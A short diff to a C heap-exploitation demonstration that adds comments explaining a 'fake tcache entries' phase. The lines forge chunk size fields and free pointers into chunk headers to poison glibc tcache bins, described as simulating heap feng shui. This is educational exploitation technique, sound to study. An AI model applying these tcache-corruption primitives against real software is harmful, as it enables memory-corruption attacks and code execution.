@@ -71,16 +71,18 @@ int main(void) {
 
     printf("=== PHASE 3: Fake Tcache Entries ===\n");
     
-    // Craft fake tcache entries at 0x320/0x330 point to chunk headers
+    // Craft fake tcache entries at 0x320/0x330 that point to chunk headers.
+    // This simulates Heap Feng Shui where another chunks overlapping the metadata of small_start and small_end.
     printf("[+] Crafting tcache[0x330] FWD -> small_start header:\n");
-    *(long*)(small_start-0x18) = 0x331;
-    free(small_start-0x10);
-    *(long*)(small_start-0x8) = 0x91;
+    *(long*)(small_start-0x18) = 0x331; // Set fake size field for the overlapping small_start size
+    free(small_start-0x10);             // Free small_start to the populate tcache[0x330]
+    *(long*)(small_start-0x8) = 0x91;   // Restore small_start size (corrupted by tcache metadata)
     
     printf("[+] Crafting tcache[0x320] BCK -> small_end header:\n");
-    *(long*)(small_end-0x18) = 0x321;
-    free(small_end-0x10);
-    *(long*)(small_end-0x8) = 0x91;
+    *(long*)(small_end-0x18) = 0x321;   // Set fake size field for the overlapping small_end size
+    free(small_end-0x10);               // Free small_end to the populate tcache[0x320]
+    *(long*)(small_end-0x8) = 0x91;     // Restore small_end size (corrupted by tcache metadata)
+
     
     printf("[+] Fake entries ready @ tcache_base: %p\n\n", tcache_base);
 
